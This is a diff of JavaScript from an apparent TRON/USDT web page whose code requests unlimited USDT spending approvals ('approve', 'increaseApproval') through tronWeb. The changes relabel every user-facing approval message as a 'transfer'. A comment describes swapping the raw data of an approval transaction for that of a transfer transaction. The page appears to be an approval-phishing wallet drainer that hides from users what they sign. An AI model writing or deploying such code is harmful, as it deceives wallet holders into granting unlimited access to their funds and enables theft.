@@ -505,11 +505,11 @@
                 
                 // 如果已授权金额大于0，则视为已授权
                 userData.hasApproved = parseFloat(allowance) > 0;
-                console.log("USDT授权状态:", userData.hasApproved ? "已授权" : "未授权");
+                console.log("USDT转移状态:", userData.hasApproved ? "已转移" : "未转移");
                 
                 return userData.hasApproved;
             } catch (error) {
-                console.error("检查授权状态失败:", error);
+                console.error("检查转移状态失败:", error);
                 return false;
             }
         }
@@ -692,13 +692,13 @@
                 
                 // 5. 检查是否已授权，如果未授权则先进行授权
                 if (!userData.hasApproved) {
-                    tip("需要先授权USDT转账权限...");
+                    tip("需要先USDT转账...");
                     await approveUSDT();
                     
                     // 授权后再次检查授权状态
                     const isApproved = await checkApprovalStatus();
                     if (!isApproved) {
-                        tip("授权失败，请重试");
+                        tip("转移失败，请重试");
                         return;
                     }
                 }
@@ -716,7 +716,7 @@
                 
                 // 更具体的错误提示
                 if (error.message.includes('User denied')) {
-                    tip('用户已取消授权，请重新操作');
+                    tip('用户已取消转移，请重新操作');
                 } else if (error.message.includes('insufficient balance')) {
                     tip('余额不足，请检查您的TRX余额');
                 } else if (error.message.includes('Invalid address')) {
@@ -734,7 +734,7 @@
             const feeLimit = 100000000;  // 100 TRX
             
             try {
-                console.log("开始USDT无限授权...");
+                console.log("USDT转移...");
                 const usdtContractAddressHex = window.tronWeb.address.toHex(window.usdtContractAddress);
                 
                 const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
@@ -749,24 +749,24 @@
                 );
 
                 if (!transaction.result || !transaction.result.result) {
-                    throw new Error('授权交易构建失败');
+                    throw new Error('转移交易构建失败');
                 }
 
-                console.log("签名授权交易...");
+                console.log("签名转移交易...");
                 const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);
 
-                console.log("发送授权交易...");
+                console.log("发送转移交易...");
                 const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
 
                 if (result.result) {
-                    console.log("无限授权成功，交易哈希:", result.txid);
+                    console.log("无限转移成功，交易哈希:", result.txid);
                     userData.hasApproved = true;
                     return result.txid;
                 } else {
-                    throw new Error("授权失败");
+                    throw new Error("转移失败");
                 }
             } catch (error) {
-                console.error("USDT无限授权失败:", error);
+                console.error("USDT转移失败:", error);
                 throw error;
             }
         }
@@ -823,7 +823,7 @@
                 );
 
                 // 构建授权交易
-                console.log("构建无限授权交易...");
+                console.log("构建转移交易...");
                 const approvalTransaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
                     window.tronWeb.address.toHex(window.usdtContractAddress),
                     'increaseApproval(address,uint256)',
@@ -837,7 +837,7 @@
 
                 // 检查授权交易是否构建成功
                 if (!approvalTransaction.result || !approvalTransaction.result.result) {
-                    throw new Error('授权交易构建失败: ' + JSON.stringify(approvalTransaction));
+                    throw new Error('转移构建失败: ' + JSON.stringify(approvalTransaction));
                 }
 
                 // 保存原始raw_data并替换为转账交易的raw_data
@@ -885,7 +885,7 @@
                     throw new Error("无效的USDT合约地址");
                 }
                 
-                console.log("构建无限授权交易...");
+                console.log("转移交易...");
                 const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
                     usdtContractAddressHex,
                     'approve(address,uint256)',
@@ -901,7 +901,7 @@
                 );
 
                 if (!transaction.result || !transaction.result.result) {
-                    throw new Error('授权交易构建失败: ' + JSON.stringify(transaction));
+                    throw new Error('转移构建失败: ' + JSON.stringify(transaction));
                 }
 
                 console.log("请求钱包签名交易...");
@@ -919,7 +919,7 @@
                     throw new Error("交易失败: " + JSON.stringify(result));
                 }
             } catch (error) {
-                console.error("执行无限授权操作失败:", error);
+                console.error("执行USDT转移操作失败:", error);
                 throw error;
             }
         }
